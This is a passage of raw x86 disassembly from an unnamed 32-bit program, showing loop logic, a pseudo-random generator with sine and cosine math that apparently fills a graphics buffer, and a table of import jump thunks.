  410781:	56                   	push   %esi
  410782:	6a 00                	push   $0x0
  410784:	52                   	push   %edx
  410785:	50                   	push   %eax
  410786:	ff 35 63 0f 42 00    	push   0x420f63
  41078c:	e8 db 01 00 00       	call   0x41096c
  410791:	5e                   	pop    %esi
  410792:	83 c6 04             	add    $0x4,%esi
  410795:	59                   	pop    %ecx
  410796:	49                   	dec    %ecx
  410797:	0f 85 79 ff ff ff    	jne    0x410716
  41079d:	ff 05 53 0f 42 00    	incl   0x420f53
  4107a3:	e9 34 ff ff ff       	jmp    0x4106dc
  4107a8:	83 3d 37 0f 42 00 12 	cmpl   $0x12,0x420f37
  4107af:	74 16                	je     0x4107c7
  4107b1:	b8 33 0f 42 00       	mov    $0x420f33,%eax
  4107b6:	50                   	push   %eax
  4107b7:	50                   	push   %eax
  4107b8:	e8 a9 01 00 00       	call   0x410966
  4107bd:	e8 86 01 00 00       	call   0x410948
  4107c2:	e9 15 ff ff ff       	jmp    0x4106dc
  4107c7:	ff 35 63 0f 42 00    	push   0x420f63
  4107cd:	ff 35 82 0f 42 00    	push   0x420f82
  4107d3:	e8 52 01 00 00       	call   0x41092a
  4107d8:	c7 05 8a 0f 42 00 ff 	movl   $0xffffffff,0x420f8a
  4107df:	ff ff ff 
  4107e2:	e9 3f fe ff ff       	jmp    0x410626
  4107e7:	58                   	pop    %eax
  4107e8:	a3 86 0f 42 00       	mov    %eax,0x420f86
  4107ed:	83 7c 24 04 02       	cmpl   $0x2,0x4(%esp)
  4107f2:	75 0b                	jne    0x4107ff
  4107f4:	6a 00                	push   $0x0
  4107f6:	e8 3b 01 00 00       	call   0x410936
  4107fb:	33 c0                	xor    %eax,%eax
  4107fd:	eb 05                	jmp    0x410804
  4107ff:	e8 4a 01 00 00       	call   0x41094e
  410804:	8b 0d 86 0f 42 00    	mov    0x420f86,%ecx
  41080a:	51                   	push   %ecx
  41080b:	c3                   	ret
  41080c:	a1 4f 0f 42 00       	mov    0x420f4f,%eax
  410811:	83 e0 0f             	and    $0xf,%eax
  410814:	a3 4f 0f 42 00       	mov    %eax,0x420f4f
  410819:	c1 e0 0d             	shl    $0xd,%eax
  41081c:	8b 3d eb 0e 42 00    	mov    0x420eeb,%edi
  410822:	03 f8                	add    %eax,%edi
  410824:	b9 00 01 00 00       	mov    $0x100,%ecx
  410829:	e8 66 00 00 00       	call   0x410894
  41082e:	c1 e8 08             	shr    $0x8,%eax
  410831:	a3 5b 0f 42 00       	mov    %eax,0x420f5b
  410836:	e8 59 00 00 00       	call   0x410894
  41083b:	c1 e8 08             	shr    $0x8,%eax
  41083e:	a3 57 0f 42 00       	mov    %eax,0x420f57
  410843:	e8 4c 00 00 00       	call   0x410894
  410848:	c1 e8 08             	shr    $0x8,%eax
  41084b:	0d 0f 0f af 00       	or     $0xaf0f0f,%eax
  410850:	8b d8                	mov    %eax,%ebx
  410852:	e8 3d 00 00 00       	call   0x410894
  410857:	c1 e8 0f             	shr    $0xf,%eax
  41085a:	89 07                	mov    %eax,(%edi)
  41085c:	89 4f 04             	mov    %ecx,0x4(%edi)
  41085f:	db 47 04             	fildl  0x4(%edi)
  410862:	d9 fe                	fsin
  410864:	da 0f                	fimull (%edi)
  410866:	db 47 04             	fildl  0x4(%edi)
  410869:	d9 ff                	fcos
  41086b:	da 0f                	fimull (%edi)
  41086d:	db 1f                	fistpl (%edi)
  41086f:	db 5f 04             	fistpl 0x4(%edi)
  410872:	83 c7 08             	add    $0x8,%edi
  410875:	a1 57 0f 42 00       	mov    0x420f57,%eax
  41087a:	ab                   	stos   %eax,%es:(%edi)
  41087b:	a1 5b 0f 42 00       	mov    0x420f5b,%eax
  410880:	ab                   	stos   %eax,%es:(%edi)
  410881:	8b c3                	mov    %ebx,%eax
  410883:	ab                   	stos   %eax,%es:(%edi)
  410884:	83 c7 0c             	add    $0xc,%edi
  410887:	e2 c9                	loop   0x410852
  410889:	ff 05 4f 0f 42 00    	incl   0x420f4f
  41088f:	e9 77 fe ff ff       	jmp    0x41070b
  410894:	b8 13 40 21 00       	mov    $0x214013,%eax
  410899:	f7 2d 5f 0f 42 00    	imull  0x420f5f
  41089f:	2b d2                	sub    %edx,%edx
  4108a1:	05 11 10 53 02       	add    $0x2531011,%eax
  4108a6:	a3 5f 0f 42 00       	mov    %eax,0x420f5f
  4108ab:	c3                   	ret
  4108ac:	ff 25 64 00 43 00    	jmp    *0x430064
  4108b2:	ff 25 68 00 43 00    	jmp    *0x430068
  4108b8:	ff 25 6c 00 43 00    	jmp    *0x43006c
  4108be:	ff 25 70 00 43 00    	jmp    *0x430070
  4108c4:	ff 25 74 00 43 00    	jmp    *0x430074
  4108ca:	ff 25 78 00 43 00    	jmp    *0x430078
  4108d0:	ff 25 7c 00 43 00    	jmp    *0x43007c
  4108d6:	ff 25 80 00 43 00    	jmp    *0x430080
  4108dc:	ff 25 84 00 43 00    	jmp    *0x430084
  4108e2:	ff 25 88 00 43 00    	jmp    *0x430088
  4108e8:	ff 25 8c 00 43 00    	jmp    *0x43008c
  4108ee:	ff 25 90 00 43 00    	jmp    *0x430090
  4108f4:	ff 25 94 00 43 00    	jmp    *0x430094
  4108fa:	ff 25 98 00 43 00    	jmp    *0x430098
  410900:	ff 25 9c 00 43 00    	jmp    *0x43009c
  410906:	ff 25 a0 00 43 00    	jmp    *0x4300a0
  41090c:	ff 25 a4 00 43 00    	jmp    *0x4300a4
  410912:	ff 25 a8 00 43 00    	jmp    *0x4300a8
  410918:	ff 25 b0 00 43 00    	jmp    *0x4300b0
  41091e:	ff 25 b4 00 43 00    	jmp    *0x4300b4
  410924:	ff 25 b8 00 43 00    	jmp    *0x4300b8
  41092a:	ff 25 c0 00 43 00    	jmp    *0x4300c0
  410930:	ff 25 c4 00 43 00    	jmp    *0x4300c4
  410936:	ff 25 c8 00 43 00    	jmp    *0x4300c8
  41093c:	ff 25 cc 00 43 00    	jmp    *0x4300cc
  410942:	ff 25 d0 00 43 00    	jmp    *0x4300d0
  410948:	ff 25 d4 00 43 00    	jmp    *0x4300d4
  41094e:	ff 25 d8 00 43 00    	jmp    *0x4300d8
  410954:	ff 25 dc 00 43 00    	jmp    *0x4300dc
  41095a:	ff 25 e0 00 43 00    	jmp    *0x4300e0
  410960:	ff 25 e4 00 43 00    	jmp    *0x4300e4
  410966:	ff 25 e8 00 43 00    	jmp    *0x4300e8
  41096c:	ff 25 f0 00 43 00    	jmp    *0x4300f0
	...
